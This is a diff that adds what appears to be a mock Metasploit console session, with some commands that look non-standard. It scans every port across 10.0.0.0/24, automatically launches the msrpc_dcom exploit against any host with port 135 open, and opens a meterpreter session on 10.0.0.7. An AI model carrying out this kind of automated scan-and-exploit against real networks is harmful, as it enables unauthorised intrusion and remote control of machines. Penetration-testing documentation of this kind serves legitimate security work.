@@ -1,0 +1,15 @@
+msfconsole > jobinit recon tcp_port_scan 10.0.0.0/24 0-65535
+Job 1 created.
+msfconsole > autoexec exploit msrpc_dcom when RPORT=135
+The msrpc_dcom will be automatically executed when:
+
+   1. Remote port 135 is found to be open.
+msfconsole > jobexec 1
+Job 1 is now executing
+msfconsole >
+Session 1 is ready for host 10.0.0.7
+msfconsole > interact 1
+meterpreter> use -m Net
+...
+^Z
+msfconsole > 
